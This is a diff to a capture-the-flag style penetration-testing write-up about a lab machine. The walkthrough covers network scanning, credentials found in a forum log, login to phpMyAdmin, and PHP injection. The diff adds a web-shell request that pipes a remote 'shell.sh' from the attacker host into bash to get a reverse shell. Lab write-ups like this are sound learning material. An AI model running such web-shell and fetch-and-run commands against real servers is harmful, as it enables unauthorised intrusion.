@@ -5,6 +5,8 @@ As the network config changes depending on the virtualization system used, we st
 ```ifconfig```
 ```nmap -sn -T4 <Network>```
 
+![](./img/01-ifconfig.png)
+
 Thanks to the info obtained, we can test our connectivity to the system and know the target OS based on the TTL
 
 ```ping <TargetIP>```
@@ -22,7 +24,7 @@ Inspecting the https service, we discovered three different directories
 
 The directories /phpmyadmin and /webmail need authentication, we'll thus focus on /forum
 
-In the /forum webpage, we found a list of users as well as some posts. One of those contains a log report, posted by lmezard. Reading carefully, we encountered a logging attempt from a user called []
+In the /forum webpage, we found a list of users as well as some posts. One of those contains a log report, posted by lmezard. Reading carefully, we encountered a logging attempt from a user called "!q\]Ej?*5K5cy*AJ"
 
 *EXPLOITATION*
 
@@ -39,6 +41,8 @@ Using this email address and the previously obtained password, we successfully l
 <SCREENSHOT>
 
 We can now authenticate in the /phpmyadmin service, gaining access to the DB. As the compromised user is root, it is likely that we have file permissions on the system. Therefore, we can try to gain access to the server by injecting PHP code to an accessible file by making use of a reverse shell.
+
+```https://10.0.2.5/forum/templates_c/rce.php?cmd=curl 10.0.2.15:9090/shell.sh | bash```
 
 <SCREENSHOT>
 
